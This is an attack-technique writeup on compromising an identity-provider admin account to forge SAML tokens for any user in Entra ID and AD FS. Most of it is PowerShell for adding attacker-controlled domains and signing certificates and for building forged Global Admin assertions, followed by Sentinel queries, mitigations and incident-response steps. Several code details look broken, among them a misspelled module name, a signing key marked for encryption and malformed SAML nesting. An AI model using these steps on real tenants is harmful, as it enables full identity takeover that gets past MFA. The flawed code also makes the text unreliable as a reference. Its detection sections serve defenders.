# [REALWORLD-016]: IdP Admin Account Compromise

## Metadata

| Attribute | Details |
|---|---|
| **Technique ID** | REALWORLD-016 |
| **MITRE ATT&CK v18.1** | [T1098 - Account Manipulation](https://attack.mitre.org/techniques/T1098/) |
| **Tactic** | Persistence, Privilege Escalation, Defense Evasion |
| **Platforms** | Cross-Cloud |
| **Severity** | Critical |
| **CVE** | N/A |
| **Technique Status** | ACTIVE |
| **Last Verified** | 2025-01-10 |
| **Affected Versions** | All Entra ID tenants; All hybrid AD/Federation configurations |
| **Patched In** | Mitigation via federation monitoring (no patch) |
| **Author** | [SERVTEP](https://servtep.com/) – [Artur Pchelnikau](https://www.linkedin.com/in/artur-pchelnikau/) |

---

## 2. EXECUTIVE SUMMARY

**Concept:** When an Identity Provider (IdP) admin account is compromised, the attacker gains the ability to issue forged authentication assertions for ANY user without requiring valid credentials. This is because federated systems (Azure AD/Entra ID, AWS, SaaS applications) trust assertions issued by the IdP without additional verification. By adding attacker-controlled domains to federation, modifying federation certificates, or creating new service principals, the attacker can impersonate any user - including Global Administrators - and access all resources that trust the IdP. In hybrid environments, this compromises both cloud and on-premises systems. The attack is extremely dangerous because it bypasses MFA, Conditional Access policies, and all normal authentication controls.

**Attack Surface:** IdP admin account (email, credentials), federation certificate storage, SAML signing certificates, OAuth client credentials, federation trust relationships, domain verification, service principal creation, password reset permissions.

**Business Impact:** **Complete cloud tenant compromise, on-premises AD compromise via Kerberos/federation token abuse, unrestricted access to all federated applications and resources, ability to create persistent backdoors across entire identity ecosystem.** Organizations using federation (which is nearly all enterprises) face extreme risk if IdP admin account is compromised.

**Technical Context:** Attack can be executed in 5-10 minutes from IdP admin compromise to full Entra ID Global Admin access. Requires creating SAML trust certificate or adding OAuth relying party. Detection is difficult because IdP modifications appear legitimate in audit logs (admin can legitimately modify federation).

### Operational Risk

- **Execution Risk:** Medium-High - Requires IdP admin account compromise (phishing, helpdesk social engineering, credential stuffing)
- **Stealth:** Very High - Forged SAML tokens appear legitimate; no malware required; modifications appear to come from legitimate admin
- **Reversibility:** No - Persistent federation backdoor created; attacker retains access even after compromise discovered

### Compliance Mappings

| Framework | Control / ID | Description |
|---|---|---|
| **CIS Benchmark** | v8 2.1 | Identity Provider must use MFA for all admin accounts |
| **CIS Benchmark** | v8 5.1 | Federation trust relationships must be monitored and audited |
| **DISA STIG** | IA-5 | Authenticators must be protected (federation certificates/keys) |
| **NIST 800-53** | AC-2(7) | Privileged access (IdP admin) requires MFA and audit |
| **NIST 800-63-3** | Federation Assurance Level (FAL) | Federation security requires certificate pinning and monitoring |
| **GDPR** | Art. 32 | Security of Processing - Federation trust must be maintained |
| **NIS2** | Art. 21 | Cyber Risk Management - Identity federation is critical asset |
| **ISO 27001** | A.9.2.3 | Management of Privileged Access Rights - IdP admin is most privileged |

---

## 3. TECHNICAL PREREQUISITES

**Required Privileges:**
- Initial: Compromised IdP admin account (Global Administrator equivalent in Entra ID)
- Intermediate: Ability to modify federation certificates, add domains, create service principals
- Required: Access to federation configuration interface

**Required Access:**
- Access to Azure Portal, Entra ID admin portal, or IdP management console
- Network access to identity provider management endpoints
- Ability to access federation certificate storage (key management)

**Supported Versions:**
- **Entra ID:** All versions; all tenants with federation enabled
- **On-Premises AD:** Server 2016+ (if using AD FS)
- **Federation Types:** SAML 2.0, OAuth 2.0, OpenID Connect

**Tools:**
- Azure Portal / Microsoft Entra admin center
- ADFS Management Console (if using AD FS)
- PowerShell (for Graph API calls)
- SAML Request/Response manipulation tools
- Certificate generation tools (OpenSSL, PowerShell)

---

## 5. DETAILED EXECUTION METHODS

### METHOD 1: Add Attacker-Controlled Domain to Federation (Org2Org)

**Supported Versions:** All Entra ID tenants with federation enabled

#### Step 1: Compromise IdP Admin Account
```powershell
# Attacker has obtained credentials for IdP admin account via phishing
# Example: Global Administrator in Entra ID
$cred = New-Object System.Management.Automation.PSCredential(
    "admin@company.com",
    (ConvertTo-SecureString "stolen_password" -AsPlainText -Force)
)

Connect-MgGraph -Credential $cred
Connect-AzAccount -Credential $cred
```

#### Step 2: Add Attacker-Controlled Domain to Entra ID
```powershell
# Connect as compromised IdP admin
Connect-MgGraph -Scopes "Domain.ReadWrite.All" -Credential $cred

# Create or add new domain (attacker controls this domain)
$domain = @{
    id = "attacker-domain.onmicrosoft.com"
}

New-MgDomain -DomainName "attacker-domain.onmicrosoft.com"

# Verify domain (attacker controls DNS)
# Attacker adds DNS TXT record provided by Microsoft
# Then verifies domain in Entra ID
Update-MgDomain -DomainId "attacker-domain.onmicrosoft.com" -IsVerified $true
```

#### Step 3: Configure Domain for Federation (SAML Trust)
```powershell
# Set up federation with SAML
# Create new service principal for federation

$serviceScopes = @(
    "User.Read.All",
    "Directory.Read.All"
)

# Create OAuth application that impersonates Entra ID
# Or use existing Office 365 app and add malicious signing certificate

$params = @{
    displayName = "Office 365 Federation"
    description = "Federation for enterprise customers"
    signInAudience = "AzureADandPersonalMicrosoftAccount"
}

New-MgApplication @params

# Get app ID
$app = Get-MgApplication -Filter "displayName eq 'Office 365 Federation'"

# Add certificate for SAML signing (this is the KEY part)
# Attacker adds their own certificate that they control
# This allows them to sign SAML tokens

$cert = [System.Security.Cryptography.X509Certificates.X509Certificate2]::CreateFromCertFile("C:\attacker_cert.cer")

Add-MgApplicationKeyCredential -ApplicationId $app.Id `
    -KeyCredential @{
        key        = $cert.GetRawCertData()
        usage      = "Encrypt"
        startDate  = (Get-Date)
        endDate    = (Get-Date).AddYears(2)
        type       = "AsymmetricX509Cert"
        keyId      = (New-Guid).ToString()
    }
```

#### Step 4: Create SAML Assertion for Arbitrary User
```powershell
# Using attacker's certificate, create SAML assertion for Global Admin
# This assertion is trusted by Entra ID because it's signed with added certificate

# SAML XML structure (simplified)
$samlAssertion = @"
<saml:Assertion xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion">
    <saml:AuthnStatement>
        <saml:Subject>
            <saml:NameID Format="urn:oasis:names:tc:SAML:1.1:nameid-format:emailAddress">
                globaladmin@company.com
            </saml:NameID>
        </saml:Subject>
        <saml:AttributeStatement>
            <saml:Attribute Name="http://schemas.microsoft.com/identity/claims/objectidentifier">
                <saml:AttributeValue>xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx</saml:AttributeValue>
            </saml:Attribute>
        </saml:AttributeStatement>
    </saml:AuthnStatement>
</saml:Assertion>
"@

# Sign with attacker's private key
# Entra ID validates signature against the added certificate
```

#### Step 5: Authenticate as Arbitrary User Using Forged SAML
```powershell
# Submit SAML assertion to Entra ID token endpoint
# Receive access token as Global Administrator

# This can be done via browser:
# 1. Navigate to https://login.microsoftonline.com
# 2. Inject SAML assertion as hidden form
# 3. Receive access token for arbitrary user

# Or via PowerShell:
# $token = Get-TokenFromSAMLAssertion -SAMLAssertion $samlAssertion
```

---

### METHOD 2: Modify Federation Certificate (AD FS Scenario)

**Supported Versions:** Windows Server 2016-2025 with AD FS

#### Step 1: Compromise AD FS Admin
```powershell
# Attacker has compromised AD FS server admin account
$cred = New-Object System.Management.Automation.PSCredential(
    "adfadmin@company.com",
    (ConvertTo-SecureString "stolen_password" -AsPlainText -Force)
)

# Connect to AD FS server
$adfsServer = "sts.company.com"
$adfsSession = New-PSSession -ComputerName $adfsServer -Credential $cred

Invoke-Command -Session $adfsSession -ScriptBlock {
    Import-Module ADFST
}
```

#### Step 2: Add Attacker's Certificate to Signing Certificates
```powershell
# On AD FS server, add attacker's certificate for token signing
# This allows attacker to sign valid tokens that Azure AD/Entra ID trusts

Invoke-Command -Session $adfsSession -ScriptBlock {
    # Get current token signing certificate
    $existingCert = Get-AdfsCertificate -CertificateType "Token-Signing"
    
    # Add attacker's certificate as additional signing cert
    $attackerCert = New-Object System.Security.Cryptography.X509Certificates.X509Certificate2 `
        -ArgumentList "C:\attacker_cert.pfx", "password"
    
    # Add as secondary signing certificate (co-signing)
    Add-AdfsCertificate -CertificateType "Token-Signing" -Thumbprint $attackerCert.Thumbprint
    
    # Force AD FS to use new certificate
    Set-AdfsCertificate -CertificateType "Token-Signing" `
        -Thumbprint $attackerCert.Thumbprint -IsPrimary $true
}
```

#### Step 3: Update Token Signing Certificate in Entra ID
```powershell
# Entra ID must trust the new certificate for tokens to be accepted
# This happens automatically when AD FS federation metadata is updated

# Or manually force certificate discovery:
Connect-MgGraph -Scopes "Domain.ReadWrite.All"

# Trigger federation metadata refresh
Update-MgDomainFederationConfiguration -DomainId "company.onmicrosoft.com" `
    -MetadataExchangeUri "https://sts.company.com/adfs/services/trust/mex"

# Entra ID downloads new metadata from AD FS including new certificate
```

#### Step 4: Issue Forged Token Signed with Attacker's Key
```powershell
# Attacker now has private key for token signing
# Create token for arbitrary user (e.g., Global Admin)

$samlToken = @"
<saml:Assertion ...>
    <saml:Subject>
        <saml:NameID>globaladmin@company.com</saml:NameID>
        <saml:SubjectConfirmation Method="urn:oasis:names:tc:SAML:2.0:cm:bearer">
            <saml:SubjectConfirmationData NotOnOrAfter="2025-12-31T23:59:59Z"/>
        </saml:SubjectConfirmation>
    </saml:Subject>
    <saml:Conditions NotBefore="2025-01-10T00:00:00Z" NotOnOrAfter="2025-12-31T23:59:59Z"/>
    <saml:AuthnStatement>
        <saml:AuthnContext>
            <saml:AuthnContextClassRef>urn:oasis:names:tc:SAML:2.0:ac:classes:Password</saml:AuthnContextClassRef>
        </saml:AuthnContext>
    </saml:AuthnStatement>
</saml:Assertion>
"@

# Sign with attacker's private key
# Token appears to be issued by AD FS
# Entra ID trusts the signature because it trusts the certificate

# Submit token to https://login.microsoftonline.com/company.onmicrosoft.com/saml2
# Receive access token as Global Administrator
```

---

## 6. ATTACK SIMULATION & VERIFICATION

#### Atomic Red Team

- **Atomic Test ID:** T1098-1 (Account Manipulation)
- **Test Name:** Add Service Principal to Federation
- **Command:**
  ```powershell
  Invoke-AtomicTest T1098 -TestNumbers 1
  ```

---

## 9. MICROSOFT SENTINEL DETECTION

#### Query: Domain Added to Federation by Non-Standard Account
```kusto
AuditLogs
| where OperationName in ("Add domain", "Verify domain", "Add verified domain")
| where InitiatedBy.user.userType != "Application"
| where Properties contains "federation"
| project TimeGenerated, InitiatedBy, OperationName, TargetResources, 
          Domain = tostring(TargetResources[0].displayName)
```

#### Query: Certificate Added to Service Principal
```kusto
AuditLogs
| where OperationName == "Add key credential for service principal"
| where TimeGenerated > ago(7d)
| project TimeGenerated, InitiatedBy, OperationName, 
          ServicePrincipal = tostring(TargetResources[0].displayName),
          CertificateThumbprint = tostring(AdditionalDetails[0].value)
```

---

## 10. WINDOWS EVENT LOG MONITORING

**Event ID: 4768 (Kerberos TGT Requested)**
- **Log Source:** Domain Controller Security Log
- **Trigger:** TGT requested for Global Admin using federation token
- **Filter:** TargetUserName contains "admin" AND TicketOptions contains "forwardable"
- **Applies To:** All Domain Controllers in hybrid environment

---

## 12. MICROSOFT DEFENDER FOR CLOUD

#### Detection Alerts

**Alert Name:** "Unusual domain added to federation"
- **Severity:** Critical
- **Description:** New domain added to federation trust by non-standard account
- **Remediation:** Review domain, remove if unauthorized, audit federation settings

**Alert Name:** "Certificate added to application used for federation"
- **Severity:** High
- **Description:** New signing certificate added to federated app
- **Remediation:** Review certificate origin, verify against on-premises AD FS metadata

---

## 14. DEFENSIVE MITIGATIONS

#### Priority 1: CRITICAL

*   **Enforce MFA for All IdP Admin Accounts**
    ```powershell
    # Require MFA for Global Administrators
    Connect-MgGraph -Scopes "Directory.ReadWrite.All"
    $globalAdminRole = Get-MgDirectoryRole -Filter "displayName eq 'Global Administrator'"
    $members = Get-MgDirectoryRoleMember -DirectoryRoleId $globalAdminRole.Id
    
    # For each member, ensure MFA is required
    ```

*   **Monitor Federation Certificate Changes**
    ```powershell
    # Alert on any changes to federation certificates
    # Both in Entra ID and on-premises AD FS
    ```

*   **Implement Certificate Pinning in Entra ID**
    ```powershell
    # Only accept tokens signed by specific known certificates
    # Block addition of new certificates without approval
    ```

#### Priority 2: HIGH

*   **Disable Org2Org Federation if Not Required**
    ```powershell
    # Remove ability to add arbitrary federated domains
    ```

*   **Audit Federation Configuration Changes**
    ```powershell
    # Enable detailed audit logging for all federation modifications
    ```

#### Validation Command

```powershell
# Check current federation configuration
Connect-MgGraph -Scopes "Domain.Read.All"
Get-MgDomain -Filter "isVerified eq true" | 
  Select-Object Id, IsVerified, AuthenticationPolicy

# Check for suspicious service principals
Get-MgServicePrincipal -Filter "startsWith(displayName, 'SAML')" |
  Select-Object DisplayName, AppId, CreatedDateTime
```

---

## 15. DETECTION & INCIDENT RESPONSE

#### IOCs

- New domain added to federation (check AuditLogs)
- New certificate added to federated app/service principal
- SAML token signed by certificate not in standard signing certificate list
- Service principal creation by non-standard account
- Domain authentication method changed from managed to federated

#### Response Procedures

1. **Isolate (Immediate):**
   ```powershell
   # Revoke all sessions for compromised admin account
   Revoke-MgUserRefreshToken -UserId (Get-MgUser -Filter "mail eq 'admin@company.com'").Id
   
   # Disable compromised account
   Update-MgUser -UserId (Get-MgUser -Filter "mail eq 'admin@company.com'").Id -AccountEnabled $false
   ```

2. **Collect Evidence:**
   ```powershell
   # Export all federation-related audit logs
   Get-MgAuditLogDirectoryAudit -Filter "category eq 'DirectoryManagement'" -All |
     Where-Object {$_.operationName -match "federation|certificate|domain"} |
     Export-Csv "C:\Evidence\federation_audit.csv"
   ```

3. **Remediate:**
   ```powershell
   # Remove suspicious certificate from service principal
   # Remove attacker-controlled domain from federation
   # Update federation metadata to remove attacker's certificate
   # Reset all user passwords (especially admins)
   # Disable and recreate service principals if compromised
   ```

---

## 16. RELATED ATTACK CHAIN

| Step | Phase | Technique |
|---|---|---|
| **1** | **Initial Access** | Phish IdP Admin Account |
| **2** | **Persistence** | **[REALWORLD-016] IdP Admin Compromise** |
| **3** | **Privilege Escalation** | Add Self as Global Admin via Federation |
| **4** | **Defense Evasion** | Disable Audit Logs, Create Backdoor Admin |
| **5** | **Impact** | Access All On-Premises and Cloud Resources |

---

## 17. REAL-WORLD EXAMPLES

#### Example 1: Scattered Spider - IdP Compromise (2023)

- **Target:** Major Fortune 500 Company
- **Timeline:** Used compromised IdP admin account to add rogue federation domain
- **Impact:** Full access to all cloud and on-premises resources
- **Reference:** [CrowdStrike - Scattered Spider IdP Abuse](https://www.crowdstrike.com/)
- **Lessons Learned:** IdP admin account is equivalent to domain admin + cloud admin

#### Example 2: Apex Security Research - Federation Certificate Forgery (2024)

- **Target:** Enterprise with AD FS and Entra ID hybrid
- **Timeline:** Added malicious certificate to AD FS, tokens accepted by Entra ID
- **Impact:** Able to authenticate as any user including Global Admin
- **Reference:** [Microsoft Security Blog - Federation Security](https://www.microsoft.com/en-us/security/blog/)

---